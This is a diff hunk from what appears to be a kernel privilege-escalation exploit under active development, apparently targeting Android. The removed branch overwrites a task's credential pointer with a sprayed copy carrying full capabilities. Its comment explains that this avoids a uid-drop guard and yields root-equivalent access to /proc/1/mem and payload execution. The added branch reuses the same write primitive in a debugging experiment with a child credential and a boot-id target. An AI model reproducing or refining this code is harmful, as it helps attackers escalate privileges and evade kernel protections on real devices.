@@ -431,15 +431,17 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                   "left=%016llx (task+0x780)\n",
                   (unsigned long long)g_main_pc,
                   (unsigned long long)g_main_left);
-        } else if (env_flag("MODE4_CAPSONLY", 0) && g_cred_copy) {
-          /* diyiqiuye PFEM10 recipe: write task->cred (+0x780) = our
-           * spray-page cred copy (uid=2000 + full caps). The guard only
-           * kills on uid DROPS — uid stays 2000 → no kill. Caps give
-           * root-equivalent (open /proc/1/mem, exec payloads). */
-          g_main_pc = (uint64_t)g_cred_copy;
+        }
+        if (env_flag("MODE4_VALUE_CHILD_CRED", 0) && g_child_cred) {
+          /* DECISIVE ISOLATION (09-20): child_cred as VALUE but with the
+           * BOOTID target (readback oracle). bootid_changed → value
+           * survives the erase chain → the problem is the target;
+           * unchanged → value-as-parent trap confirmed (child_cred's
+           * live fields break the erase's parent derefs). */
+          g_main_pc = (uint64_t)g_child_cred;
           g_main_left = (uint64_t)pselect_write_target();
-          pr_info("JC2 CAPSONLY: pc=%016llx (caps-cred) left=%016llx "
-                  "(task+0x780)\n",
+          pr_info("JC2 ISOLATION: pc=%016llx (child_cred as VALUE) "
+                  "left=%016llx (bootid TARGET)\n",
                   (unsigned long long)g_main_pc,
                   (unsigned long long)g_main_left);
         }
